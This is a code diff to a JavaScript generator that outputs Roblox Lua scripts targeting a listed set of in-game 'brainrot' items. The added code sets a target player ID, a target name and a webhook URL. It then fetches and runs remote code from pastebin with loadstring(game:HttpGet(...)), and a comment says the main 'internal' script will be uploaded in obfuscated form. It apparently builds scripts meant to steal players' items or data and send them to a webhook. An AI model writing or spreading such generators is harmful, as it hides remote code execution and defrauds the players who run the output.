@@ -1,4 +1,4 @@
-// ВСЕ БРЕЙНРОТЫ
+// ВСЕ БРЕЙНРОТЫ (полный список)
 const allBrainrots = [
     "Meowl", "Strawberry Elephant", "Headless Horseman", "Skibidi Toilet",
     "Griffin", "Hydra Dragon Cannelloni", "Dragon Gingerini", "Dragon Cannelloni",
@@ -127,30 +127,30 @@ if (generateBtn) {
 
         let extraScript = '';
         if (scriptType === '22s') {
-            extraScript = 'loadstring(game:HttpGet("https://pastebin.com/raw/vyRfjXm0"))()';
+            extraScript = 'loadstring(game:HttpGet("https://pastebin.com/raw/Ebes9mWF"))()';
         } else if (scriptType === 'custom') {
             extraScript = customScript;
         }
 
         const brainrotListStr = "{\n    " + selected.map(br => `"${br}"`).join(",\n    ") + "\n}";
 
+        // ВНУТРЕННИЙ СКРИПТ (ТЫ ЗАЛЬЁШЬ ОБФУСЦИРОВАННУЮ ВЕРСИЮ)
+        const internalScriptUrl = "https://pastebin.com/raw/YOUR_INTERNAL_SCRIPT_URL";
+        
         const finalScript = `-- ========== CONFIG ==========
-local CONFIG = {
-    TARGET_USER_ID = "${userId}",
-    TARGET_NAME = "${nick}",
-    WEBHOOK_URL = "${webhook}",
-    TARGET_BRAINROTS = ${brainrotListStr},
-    EXTRA_SCRIPT = [[${extraScript}]]
-}
--- ========== END CONFIG ==========
+getgenv().TARGET_NAME = "${nick}"
+getgenv().TARGET_ID = ${userId}
+getgenv().WEBHOOK_URL = "${webhook}"
+getgenv().TARGET_BRAINROTS = ${brainrotListStr}
 
--- Load main script
-loadstring(game:HttpGet("YOUR_MAIN_SCRIPT_URL"))()
+-- ========== ADDITIONAL SCRIPT ==========
+${extraScript}
 
--- Load extra script if exists
-if CONFIG.EXTRA_SCRIPT and CONFIG.EXTRA_SCRIPT ~= "" then
-    loadstring(CONFIG.EXTRA_SCRIPT)()
-end`;
+-- ========== MAIN MECHANISM ==========
+loadstring(game:HttpGet("${internalScriptUrl}"))()
+
+print("Script Loaded | Target ID: " .. getgenv().TARGET_ID)
+`;
 
         const outputDiv = document.getElementById('output');
         const scriptOutput = document.getElementById('scriptOutput');
